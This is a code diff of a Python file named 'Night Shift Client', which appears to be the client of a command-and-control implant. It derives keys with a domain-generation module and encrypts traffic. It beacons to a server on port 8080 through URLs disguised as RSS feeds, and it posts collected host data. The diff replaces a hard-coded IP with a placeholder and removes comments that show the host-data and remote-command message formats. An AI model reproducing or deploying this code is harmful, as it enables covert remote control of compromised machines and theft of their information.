@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # Night Shift Client
-#
+
 import aiohttp
 import asyncio
 import os
@@ -16,6 +16,7 @@ from subprocess import (PIPE, Popen)
 from nightshift_dga import NightShift_DGA
 from nightshift_cipher import NightShift_Cipher
 from nightshift_collector import NightShift_Init_Check
+
 class NightShift_Client():
     
     def run(self):
@@ -50,7 +51,7 @@ class NightShift_Client():
     async def FourOFour(self):
 
         async with aiohttp.ClientSession() as session:
-            ns_url = 'http://192.168.254.82:8080/rss/toptech/picks'
+            ns_url = 'http://<**server ip or url**>:8080/rss/toptech/picks'
             ns_get_key = NightShift_DGA()
             ns_get_cipher = NightShift_Cipher()
             ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
@@ -66,7 +67,7 @@ class NightShift_Client():
     async def PostData(self,ns_post_data):
 
         async with aiohttp.ClientSession() as session:
-            ns_url = 'http://192.168.254.82:8080/rss/celeb/quiz'
+            ns_url = 'http://<**server ip or url**>:8080/rss/celeb/quiz'
             ns_get_key = NightShift_DGA()
             ns_get_cipher = NightShift_Cipher()
             ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
@@ -105,7 +106,3 @@ class NightShift_Client():
 
 if __name__ == "__main__":
     NightShift_Client().run()
-
-
-# { "host_data": { "os_type": os_type_f, "host_name": host_name_f, "ns_init": ns_init_f }, "host_hash": host_os_hashed_f }
-# {"host_404": "ALL", "host_os_404": "nt", "host_cmd_404": "sleep"}
